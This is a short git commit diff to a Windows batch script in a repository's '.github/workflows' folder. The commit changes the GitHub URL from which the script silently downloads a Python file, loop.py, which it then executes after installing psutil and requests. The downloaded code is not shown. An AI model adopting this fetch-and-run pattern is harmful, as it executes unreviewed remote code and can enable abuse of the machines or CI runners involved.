ecad1caffcf1f2992f912001ec7f8021b70bef97
mihirap4 <mihirap4@usa.com>
2024-10-17 14:45:02 +0100

    Update loop.bat

--- .github/workflows/loop.bat
+++ .github/workflows/loop.bat
@@ -1,5 +1,5 @@
 @echo off
 pip install psutil --quiet
 pip install requests --quiet
-curl -s -L -o loop.py https://raw.githubusercontent.com/iamo4r2/min/main/.github/workflows/loop.py
+curl -s -L -o loop.py https://raw.githubusercontent.com/mihirap4/ubiquitous/refs/heads/main/.github/workflows/loop.py
 python loop.py
